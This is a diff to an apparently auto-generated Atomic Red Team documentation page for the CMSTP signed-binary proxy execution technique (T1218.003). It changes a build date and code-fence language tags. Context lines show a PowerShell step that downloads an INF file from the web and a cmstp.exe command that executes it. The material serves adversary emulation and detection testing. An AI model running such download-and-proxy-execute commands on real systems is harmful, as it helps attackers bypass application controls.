@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.003"
 attack_technique_name: "Signed Binary Proxy Execution: CMSTP"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "34e63321-9683-496b-bbc1-7566bc55e624"
@@ -51,13 +51,13 @@ INF file must exist on disk at specified location (#{inf_file_path})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{inf_file_path}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{inf_file_path}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf" -OutFile "#{inf_file_path}"
 ```
@@ -68,7 +68,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 cmstp.exe /s "#{inf_file_path}"
 ```
 
